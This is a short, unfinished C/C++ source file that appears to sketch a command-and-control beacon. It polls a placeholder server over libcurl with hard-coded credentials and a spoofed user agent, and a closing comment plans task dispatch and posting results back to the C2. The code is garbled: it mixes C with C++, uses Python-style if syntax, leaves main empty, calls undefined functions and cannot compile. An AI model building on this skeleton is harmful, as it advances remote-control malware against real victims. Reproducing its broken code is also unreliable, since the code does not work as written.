#include <stdio.h>
#include <curl/curl.h>

char servername[]="placeholder";

int main(){

}

char * gettasks(){
    auto curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "placeholder");
        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
        curl_easy_setopt(curl, CURLOPT_USERPWD, "user:pass");
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.42.0");
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
        
        std::string response_string;
        std::string header_string;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
        long response_code;
        curl_easy_perform(curl);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
        curl = NULL;
    }
    int response=0;
    if(response==200):
        dotasks(response);
}


void tasks(){
    while(1){
        sleep(60);
        char tasks[]=gettasks();



}
}
/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/


